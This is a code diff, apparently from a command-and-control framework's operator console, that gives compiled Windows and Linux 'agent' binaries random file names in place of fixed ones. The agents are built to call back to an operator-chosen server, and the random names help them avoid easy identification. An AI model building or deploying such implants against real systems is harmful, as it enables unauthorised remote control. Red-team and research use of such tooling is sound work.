@@ -7,6 +7,7 @@ import os
 import subprocess
 import base64
 import ssl
+import random
 
 
 from prompt_toolkit import PromptSession, print_formatted_text
@@ -145,6 +146,29 @@ def compile_agent(source_file, target_os, output_name, built_server_url):
     except Exception as e:
         print_formatted_text(ANSI(f"\n{RED}[-] exception : {e}{RESET}\n"))
     return
+
+def agent_name_gen(target_os):
+    
+    chars =["a","b","c", "d", "e", "f", "1", "2", "3", "4", "5"]
+    name = ""
+    first = ""
+    last = ""
+
+    if target_os == "windows":
+        first = "win"
+        last = ".exe"
+    else:
+        first = "lin"
+        last = ".elf"
+    
+
+    for i in range(1 , 10):
+        c = random.choice(chars)
+        name = name + c
+
+    return f"{first}_{name}{last}"
+
+
 
 
 
@@ -405,10 +429,10 @@ async def main(server_url, event_url):
                         built_server_url = f"{agent_http_scheme}://{ip}:{port}"
 
                         if target_os == "windows":
-                            output_name = "agent_windows.exe"
+                            output_name = agent_name_gen(target_os)
                             compile_agent(windows_agent_path, target_os, output_name,built_server_url) 
                         else:
-                            output_name = "agent_linux"
+                            output_name = agent_name_gen(target_os)
                             compile_agent(linux_agent_path, target_os, output_name,built_server_url)
 
 
